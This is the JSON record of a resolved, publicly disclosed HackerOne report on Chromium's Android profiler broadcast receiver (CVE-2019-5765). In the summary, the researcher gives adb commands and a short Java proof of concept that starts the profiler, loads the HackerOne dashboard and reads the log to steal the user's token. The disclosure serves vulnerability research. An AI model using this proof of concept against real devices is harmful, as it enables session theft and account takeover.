{"id":563870,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjM4NzA=","url":"https://hackerone.com/reports/563870","title":"CVE-2019-5765: 1-click HackerOne account takeover on all Android devices","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-01-16T12:46:10.000Z","submitted_at":"2019-01-16T12:46:10.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bagipro","url":"/bagipro","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1826,"url":"https://hackerone.com/chromium","handle":"chromium","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/826/f15316d5464a578f2ff83433a149f805c84cba05_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/826/f15316d5464a578f2ff83433a149f805c84cba05_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"profile":{"name":"Chrome","twitter_handle":"googlechrome","website":"http://chromium.org","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-05-07T23:37:43.670Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"████████████","original_report_id":null,"original_report_url":null,"attachments":[{"id":483472,"file_name":"h1_token.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/483/472/0a66eee86f5277d0403fbd086d7730820d225106/h1_token.png?response-content-disposition=attachment%3B%20filename%3D%22h1_token.png%22%3B%20filename%2A%3DUTF-8%27%27h1_token.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151111Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9a836c9639f72aae7556e54bbebdf9788b1101dbcf9edb755427492f2dcd7899","file_size":14517,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":341,"voters":["gu1mas","kiyell","ermilov","msultan","mzfr","cdl","dumeelvavvalu","kapytein","mashoud1122","michiel","and 331 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4730050,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-01-17T12:46:10.000Z","updated_at":"2019-01-17T12:46:10.000Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bagipro","url":"/bagipro"},"genius_execution_id":null,"team_handle":"chromium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4771158,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-05-07T23:37:43.698Z","updated_at":"2019-05-07T23:37:43.698Z","actor":{"username":"fern","cleared":false,"url":"/fern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/756/5366427ef9c8b92ac9e8fdb6f18354461ca8388b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chromium","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":15674,"category":"researcher","content":"Hi, this is a story about a technically very simple bug which allowed to dump history from all Chromium embedders (Chromium-based browsers and WebView users). It was disclosed yesterday by Chromium team, that’s why I can now publish details about it.\n\nIn December 2018 I suddenly found a bug in Chromium Android core when participated in Samsung bug bounty program and looked for bugs in Samsung Browser. I discovered a publicly registered broadcast receiver (actually there are tons of them in apps from HackerOne scope, but I don’t disclose them due to low impact) in file  https://github.com/chromium/chromium/blob/2d57e5b/content/public/android/java/src/org/chromium/content/browser/TracingControllerAndroidImpl.java#L300. It activated a profiler (logger of all requests) when received a broadcast with action ``` %app_package%.GPU_PROFILER_START ```. Then I tried to reproduce it in Chrome Browser and it worked!\n1. Sent a broadcast from ADB: ``` adb shell am broadcast -a com.android.chrome.GPU_PROFILER_START ```\n2. Loaded a page in Chrome\n3. Stopped the profiler ``` adb shell am broadcast -a com.android.chrome.GPU_PROFILER_STOP ```\n\nI expected to see useless ``` .hprof ``` file, but when opened I found all URLs and request headers (except cookies) logged here. Then I retried to do the same in PayPal app, and the bug worked too. It appeared that the profiler was registered automatically in all apps.\n\nSince HackerOne uses OAuth for authorization, its users could be under attack too. I think the attack complexity was pretty low using Android Instant Apps, they are activated by default on recent Androids (to observe the behavior, just google ``` vimeo video ``` and click on a video, Vimeo app is launched automatically even if you don’t have it installed on your device).\n\nPoC to abuse a HackerOne account\n```java\n// activates the profiler in Chrome browser\nsendBroadcast(new Intent(\"com.android.chrome.GPU_PROFILER_START\"));\n\n// opens a page in Chrome, logs will be written automatically\nstartActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://hackerone.com/hacker_dashboard/my_programs\")));\n\n// stops the profiler, delay is 2s to let the page load\nnew Handler().postDelayed(() -\u003e sendBroadcast(new Intent(\"com.android.chrome.GPU_PROFILER_STOP\")), 2000);\n```\n\nAnd now you can read the log file (by default it’s written to ``` /sdcard/ ```, but you can control output path by supplying ``` -e file /any/path ```) and theft leaked HackerOne token\n{F483472}\n\nLinks: \n* https://www.wired.com/story/android-vulnerability-five-years-fragmentation/\n* https://www.theregister.co.uk/2019/03/20/google_android_browser_vulnerability/","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":52239,"username":"bagipro","name":"Sergey Toshin","bio":"","cleared":true,"website":"https://oversecured.com/","location":"","created_at":"2016-01-21T22:43:16.784Z","url":"https://hackerone.com/bagipro","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}